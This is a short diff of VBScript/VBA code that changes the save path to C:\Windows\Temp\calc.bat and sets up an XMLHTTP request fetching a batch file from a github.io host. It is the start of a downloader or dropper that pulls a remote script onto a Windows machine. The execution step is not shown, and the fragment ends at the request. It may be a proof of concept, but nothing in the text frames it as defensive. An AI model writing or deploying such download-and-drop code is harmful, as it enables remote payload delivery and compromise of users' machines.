@@ -1,6 +1,6 @@
 Dim xHttp, bStrm, filePath
 
-filePath = Environ("TEMP") & "\calc.bat"
+filePath = "C:\Windows\Temp\calc.bat"
 
 Set xHttp = CreateObject("MSXML2.XMLHTTP")
 xHttp.Open "GET", "https://james-sapphire.github.io/calc.bat", False
